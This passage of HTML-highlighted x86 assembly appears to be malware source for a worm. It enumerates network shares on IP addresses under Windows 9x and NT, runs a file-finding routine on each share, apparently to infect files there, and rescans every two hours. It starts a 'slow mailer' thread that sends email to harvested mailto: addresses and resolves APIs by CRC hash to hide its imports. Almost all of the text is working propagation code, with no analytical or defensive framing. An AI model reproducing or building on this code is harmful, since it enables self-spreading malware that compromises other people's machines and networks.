        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;store Unicode half-character</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">;remove character if ANSI</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ip_hex2dec</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;store Unicode half-character</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">;remove character if ANSI</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ip_shift</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;include Unicode half-character</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                        </span><span class="sc1">;remove character if ANSI</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;store '\\' in ANSI or Unicode</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ip_sharent</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;enumerate shares on IP address (9x/Me platform)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;too small size returns needed size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ip9xcrcstk.ip9xNetShareEnum</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_MORE_DATA</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ip_restore</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">share_info_19x</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">
                                                </span><span class="sc1">;include size of optional remark</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;GMEM_FIXED</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalAlloc</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ip_restore</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;GlobalFree</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ip9xcrcstk.ip9xNetShareEnum</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">ip_next9x</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movs</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;attach sharename</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cSetCurrentDirectoryA</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ip_skip9x</span><span class="sc0">

        </span><span class="sc1">;I dream of rain, I live my years under an open sky</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_files</span><span class="sc0">

</span><span class="sc5">ip_skip9x</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">share_info_19x</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">share_info_19x.shi1_pad1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">ip_next9x</span><span class="sc0">

</span><span class="sc5">ip_free9x</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalFree</span><span class="sc0">

</span><span class="sc5">ip_restore</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">leave</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ip_save</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">120</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">                 </span><span class="sc1">;2 hours</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cSleep</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_ip</span><span class="sc0">

</span><span class="sc5">ip_sharent</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;enumerate shares on IP address (NT/2000/XP platform)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PREFERRED_LENGTH</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">44h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ipntcrcstk.ipntNetShareEnum</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;NetApiBufferFree</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ip_freent</span><span class="sc0">

</span><span class="sc5">ip_nextnt</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;lstrlenW</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc4">]</span><span class="sc0">
                                                </span><span class="sc1">;include size of Unicode '\\' + Unicode IP address + Unicode '\'</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GMEM_FIXED</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalAlloc</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">ip_freent</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;GlobalFree</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;SetCurrentDirectoryW</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;lstrcatW</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;lstrcatW</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;lstrcatW</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;lstrcatW</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.klstrcpyW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">                    </span><span class="sc1">;copy IP address</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clstrcatW</span><span class="sc0">                       </span><span class="sc1">;attach '\'</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">clstrcatW</span><span class="sc0">                       </span><span class="sc1">;attach sharename</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kSetCurrentDirectoryW</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalFree</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ip_skipnt</span><span class="sc0">

        </span><span class="sc1">;when you look into the abyss, the abyss looks back at you</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_files</span><span class="sc0">

</span><span class="sc5">ip_skipnt</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">share_info_1nt</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ip_nextnt</span><span class="sc0">

</span><span class="sc5">ip_freent</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ipntcrcstk.ipntNetApiBufferFree</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ip_restore</span><span class="sc0">
</span><span class="sc5">find_ip</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">create_thr3</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cCreateThread</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;thread 4: send email to last mailto: address found.  slow mailer</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"23"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"_2sw"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cLoadLibraryA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">found_ws2</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"23k"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc3">"cosw"</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cLoadLibraryA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">found_ws2</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">init_findmz</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">ws2crcbegin</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">ws2crc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ws2crcend</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wsock_init</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ws2crcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">wsock_init</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">enter</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">WSADATA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ws2crcstk.wWSAStartup</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">leave</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
